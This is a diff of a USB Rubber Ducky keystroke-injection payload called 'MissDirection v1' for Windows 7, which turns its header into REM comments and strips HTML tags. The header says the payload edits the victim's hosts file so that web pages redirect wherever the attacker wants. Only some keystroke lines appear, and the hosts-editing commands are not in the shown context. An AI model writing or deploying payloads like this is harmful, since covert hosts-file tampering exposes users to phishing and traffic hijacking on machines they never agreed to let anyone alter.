@@ -1,13 +1,11 @@
-MissDirection v1
+REM MissDirection v1
+REM 
+REM Author: Bucky67GTO
+REM Duckencoder: 2.2
+REM Target: Windows 7
+REM 
+REM Payload will edit the hosts file to allow you to redirect web pages where you would like the user to go.
 
-Author: Bucky67GTO
-Duckencoder: 2.2
-Target: Windows 7
-
-Payload will edit the hosts file to allow you to redirect web pages where you would like the user to go.
-
-<pre>
-<code>
 DELAY 2000
 ESCAPE
 CONTROL ESCAPE
@@ -24,5 +22,3 @@ ENTER
 DELAY 400
 ALT SPACE
 STRING c
-</code>
-</pre>
